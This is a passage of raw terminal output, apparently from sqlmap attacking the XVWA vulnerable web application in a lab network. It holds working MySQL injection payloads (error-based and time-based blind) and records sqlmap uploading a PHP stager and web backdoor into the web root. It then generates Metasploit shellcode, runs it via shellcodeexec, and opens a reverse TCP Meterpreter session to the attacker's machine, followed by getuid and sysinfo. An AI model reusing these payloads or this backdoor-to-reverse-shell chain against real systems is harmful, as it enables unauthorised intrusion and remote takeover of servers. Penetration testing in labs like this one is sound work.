    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:53:24] [INFO] testing MySQL
[18:53:24] [INFO] confirming MySQL
[18:53:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:53:24] [INFO] going to use a web backdoor to establish the tunnel
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[18:53:27] [INFO] retrieved the web server document root: '/var/www'
[18:53:27] [INFO] retrieved web server absolute paths: '/var/www/html/xvwa/vulnerabilities/sqli/home.php'
[18:53:27] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:53:27] [WARNING] unable to upload the file stager on '/var/www/'
[18:53:27] [INFO] trying to upload the file stager on '/var/www/xvwa/vulnerabilities/sqli/' via LIMIT 'LINES TERMINATED BY' method
[18:53:28] [WARNING] unable to upload the file stager on '/var/www/xvwa/vulnerabilities/sqli/'
[18:53:28] [INFO] trying to upload the file stager on '/var/www/html/xvwa/vulnerabilities/sqli/' via LIMIT 'LINES TERMINATED BY' method
[18:53:28] [INFO] the file stager has been successfully uploaded on '/var/www/html/xvwa/vulnerabilities/sqli/' - http://xvwa:80/xvwa/vulnerabilities/sqli/tmpuksxn.php
[18:53:28] [INFO] the backdoor has been successfully uploaded on '/var/www/html/xvwa/vulnerabilities/sqli/' - http://xvwa:80/xvwa/vulnerabilities/sqli/tmpbxzmd.php
[18:53:28] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Bind TCP: Listen on the database host for a connection
> 1
what is the local address? [Enter for '10.0.0.22' (detected)] 
which local port number do you want to use? [8872] 1234
which payload do you want to use?
[1] Shell (default)
[2] Meterpreter (beta)
> 2
[18:53:39] [INFO] creation in progress ............. done
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 
[18:53:54] [INFO] uploading shellcodeexec to '/tmp/tmpsedxjf'
[18:53:54] [INFO] shellcodeexec successfully uploaded
[18:53:54] [INFO] running Metasploit Framework command line interface locally, please wait..
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v5.0.82-dev                          ]
+ -- --=[ 1989 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 559 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: When in a module, use back to go back to the top level prompt

PAYLOAD => linux/x86/meterpreter/reverse_tcp
EXITFUNC => process
LPORT => 1234
LHOST => 10.0.0.22
[*] Started reverse TCP handler on 10.0.0.22:1234 
[18:54:10] [INFO] running Metasploit Framework shellcode remotely via shellcodeexec, please wait..
[*] Sending stage (989416 bytes) to 10.0.0.18
[*] Meterpreter session 1 opened (10.0.0.22:1234 -> 10.0.0.18:55758) at 2020-04-12 18:54:10 -0500

meterpreter > getuid
getuid
Server username: no-user @ xvwa (uid=33, gid=33, euid=33, egid=33)
meterpreter > sysinfo
sysinfo
Computer     : 10.0.0.18
OS           : Ubuntu 14.04 (Linux 4.4.0-31-generic)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

